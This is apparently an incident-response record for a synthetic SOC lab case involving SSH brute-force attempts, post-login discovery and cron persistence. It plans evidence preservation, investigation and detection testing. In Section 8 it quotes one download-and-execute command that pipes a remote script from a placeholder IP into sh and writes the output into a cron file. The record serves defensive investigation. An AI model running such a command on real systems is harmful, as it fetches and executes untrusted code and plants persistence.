# CASE-010 — Incident Response Record

## 1. Purpose

This document records the incident-response approach for CASE-010.

The scenario is a synthetic SOC laboratory investigation involving:

1. repeated SSH authentication failures;
2. successful authentication;
3. post-authentication discovery and privilege-related activity; and
4. suspicious Linux cron persistence activity.

The response actions described in this document are recommended laboratory procedures unless explicitly identified as executed.

No production containment or remediation action was performed as part of this case documentation.

## 2. Response Status

| Field                 | Value                             |
| --------------------- | --------------------------------- |
| Case ID               | `CASE-010`                        |
| Scenario              | Multi-Stage Attack                |
| Environment           | Synthetic SOC laboratory          |
| Correlation           | `DET-CORR-001`                    |
| Correlated severity   | Critical                          |
| Correlated confidence | High                              |
| Host                  | `lab-linux-10`                    |
| User                  | `root`                            |
| Status                | Investigation / response planning |

The critical severity represents the priority assigned by the correlation logic.

It does not independently prove compromise.

## 3. Response Principles

The response process follows these priorities:

```text
Preserve evidence
       ↓
Validate scope
       ↓
Contain risk
       ↓
Investigate cause
       ↓
Eradicate confirmed malicious artifacts
       ↓
Recover systems
       ↓
Validate controls
       ↓
Close and improve detection
```

Evidence preservation should occur before destructive remediation whenever operationally safe.

## 4. Initial Response Assessment

The correlated alert represents three detection stages:

| Stage | Detection       | Activity                                                             |
| ----- | --------------- | -------------------------------------------------------------------- |
| 1     | `DET-AUTH-001`  | Repeated SSH authentication failures followed by success             |
| 2     | `DET-AUTH-003`  | Post-authentication session and discovery/privilege-related commands |
| 3     | `DET-LINUX-001` | Suspicious cron persistence with download-and-execute behavior       |

The sequence occurs on the same laboratory host and user within the configured 30-minute correlation window.

The observed sequence spans approximately ten minutes from the successful authentication event to the suspicious persistence event.

## 5. Evidence Preservation

Before remediation, preserve the following evidence where available:

### Authentication Evidence

```text
EVT-010001
EVT-010002
EVT-010003
EVT-010004
EVT-010005
EVT-010006
EVT-010007
```

### Session Evidence

```text
EVT-010008
EVT-010009
EVT-010010
EVT-010011
EVT-010012
```

### Persistence Evidence

```text
EVT-010013
```

### Benign Comparison Evidence

```text
EVT-010014
```

The benign event should be retained because it provides useful context for evaluating false-positive behavior.

## 6. Detection Evidence Preservation

Preserve the normalized alert outputs:

```text
cases/CASE-010/auth-001-alerts.json
cases/CASE-010/auth-003-alerts.json
cases/CASE-010/linux-001-alerts.json
cases/CASE-010/alert.json
```

These artifacts preserve the relationship between individual detections and the final correlation alert.

The underlying event IDs should remain traceable to the source telemetry.

## 7. Immediate Containment Considerations

In a real environment, containment decisions could include:

### Account Protection

If unauthorized access were confirmed or strongly suspected:

* disable or restrict the affected account;
* terminate unauthorized sessions;
* rotate affected credentials;
* review privileged-account access; and
* validate authorized administrators.

Because this is a laboratory scenario, these actions are recommendations only.

### Network Containment

Depending on validated evidence:

* restrict suspicious source infrastructure;
* isolate the affected host;
* block confirmed malicious destinations;
* preserve relevant firewall/proxy evidence; and
* monitor for related activity.

The synthetic scenario does not establish that the download endpoint is malicious.

Therefore, no real-world blocking decision should be inferred from the laboratory indicators.

### Host Containment

If compromise were confirmed in a real environment:

* isolate the host from unnecessary network access;
* preserve volatile and persistent evidence;
* prevent further execution where operationally appropriate; and
* maintain chain-of-custody procedures.

No such production action was performed for CASE-010.

## 8. Persistence Investigation

The highest-priority host artifact is:

```text
/etc/cron.d/system-update
```

The associated command is:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

A real investigation should determine:

* whether the file exists;
* file creation/modification timestamps;
* owner and group;
* permissions;
* file contents;
* cron syntax;
* execution schedule;
* process responsible for creation;
* subsequent executions;
* related files; and
* related network connections.

The available synthetic telemetry does not provide all of these facts.

## 9. Payload Investigation

The referenced resource is:

```text
/payload.sh
```

The telemetry does not contain the payload itself.

Therefore, eradication should not be based solely on the assumption that the referenced resource was malicious.

If the actual file were obtained in a real investigation, analysts should:

1. preserve the original sample;
2. calculate cryptographic hashes;
3. identify the file type;
4. perform static analysis;
5. inspect suspicious commands;
6. scan with approved detection tooling;
7. perform controlled dynamic analysis where authorized; and
8. correlate observed behavior with endpoint and network telemetry.

The existing CYBERNOVA Malware Analysis Sandbox could provide a controlled analysis capability for an obtained laboratory sample.

## 10. Authentication Investigation

The authentication sequence contains:

```text
6 failed attempts
        ↓
successful SSH authentication
        ↓
session establishment
```

A real response should validate:

* whether the account owner expected the access;
* source-address legitimacy;
* authentication method;
* authentication key or credential involved;
* session duration;
* privilege level;
* commands executed; and
* other sessions associated with the account.

The current case does not establish unauthorized access.

## 11. Post-Authentication Investigation

The session `SES-010-A` contains:

```text
whoami
id
sudo -l
uname -a
```

These commands provide discovery and privilege-related context.

They are not independently malicious.

Their investigative significance comes from their position after successful authentication and before suspicious persistence activity.

## 12. Eradication Considerations

If malicious persistence were confirmed in a real environment, eradication could include:

* removing the confirmed malicious cron entry;
* removing confirmed malicious payloads;
* terminating malicious processes;
* revoking compromised credentials;
* removing unauthorized access mechanisms;
* correcting affected permissions; and
* addressing the initial access vector.

Eradication must be based on validated evidence rather than assumptions.

No eradication action is claimed for CASE-010.

## 13. Recovery Considerations

After confirmed eradication, recovery should include:

1. restore required services;
2. validate system integrity;
3. verify scheduled-task configuration;
4. verify privileged-account access;
5. monitor authentication activity;
6. monitor network connections;
7. confirm expected application behavior; and
8. maintain heightened monitoring for recurrence.

Recovery should not be considered complete until relevant security controls have been validated.

## 14. Detection Validation After Recovery

The response process should include regression testing.

The following conditions should be tested:

### Authentication Attack

Expected:

```text
DET-AUTH-001 → alert
```

### Post-Authentication Activity

Expected:

```text
DET-AUTH-003 → alert
```

### Suspicious Persistence

Expected:

```text
DET-LINUX-001 → alert
```

### Multi-Stage Sequence

Expected:

```text
DET-AUTH-001
       +
DET-AUTH-003
       +
DET-LINUX-001
       ↓
DET-CORR-001
```

### Benign Cron Administration

Expected:

```text
crontab -e → no DET-LINUX-001 alert
```

This validation helps ensure that response improvements do not weaken detection coverage.

## 15. Escalation Criteria

In a real SOC, escalation should be considered when:

* privileged-account compromise is suspected;
* persistence is confirmed;
* multiple systems are affected;
* malware execution is confirmed;
* credentials may have been compromised;
* sensitive assets may have been accessed;
* malicious infrastructure is confirmed; or
* additional stages are identified.

CASE-010 should remain a laboratory exercise unless evidence outside the synthetic scenario is introduced.

## 16. Recovery Monitoring

Post-recovery monitoring should focus on:

* repeated authentication failures;
* successful authentication after repeated failures;
* unusual privileged sessions;
* unexpected cron modifications;
* shell download-and-execute behavior;
* new persistence locations;
* unexpected outbound connections;
* recurrence of related source addresses; and
* additional correlated detection stages.

The monitoring period should be determined according to the organization's incident-response policy.

## 17. Closure Criteria

A real incident should not be closed solely because the original alert disappears.

Recommended closure criteria include:

* evidence preserved;
* investigation completed;
* scope assessed;
* malicious activity confirmed or reasonably excluded;
* persistence reviewed;
* credentials addressed where necessary;
* affected systems validated;
* detection controls tested;
* required stakeholders notified;
* final report completed; and
* lessons learned recorded.

For this laboratory case, closure should additionally require completion of the CASE-010 evidence package.

## 18. Evidence Classification

### Observed Evidence

Examples include:

* six failed authentication events;
* successful authentication;
* session establishment;
* discovery commands;
* privilege-related commands;
* suspicious cron persistence event;
* referenced download command;
* three underlying detection alerts; and
* one correlated alert.

### Analyst Interpretation

Examples include:

* the sequence is consistent with a multi-stage attack pattern;
* the persistence command warrants investigation;
* privileged activity increases investigative priority; and
* the three stages are meaningfully correlated.

### Unproven Claims

The evidence does not independently establish:

* attacker identity;
* unauthorized access;
* malicious payload contents;
* successful payload execution;
* successful persistence execution;
* data access;
* data exfiltration; or
* confirmed host compromise.

## 19. Response-to-Detection Feedback

The response workflow should feed improvements back into detection engineering.

```text
Incident evidence
       ↓
Response investigation
       ↓
Observed detection gap
       ↓
Detection improvement
       ↓
Regression test
       ↓
Validation
       ↓
Updated SOC capability
```

CASE-010 provides an important correlation-layer validation point because individual detections become more meaningful when connected through host, user, source context, chronology, and a bounded correlation window.

## 20. Laboratory Safety

All response actions must remain within the authorized laboratory environment.

The case does not authorize:

* access to third-party systems;
* real-world credential attacks;
* blocking external infrastructure;
* deployment of malware;
* unauthorized persistence;
* destructive remediation outside the lab; or
* claims of production incident response.

The purpose of the exercise is defensive SOC investigation and engineering validation.

## 21. Analyst Conclusion

CASE-010 demonstrates a complete response-planning path from detection through evidence preservation, containment considerations, persistence investigation, eradication planning, recovery, validation, and closure.

The observed telemetry supports investigation of a coherent multi-stage attack sequence.

The evidence does not independently establish confirmed compromise.

Any production response decision would require additional validated evidence and authorized operational procedures.
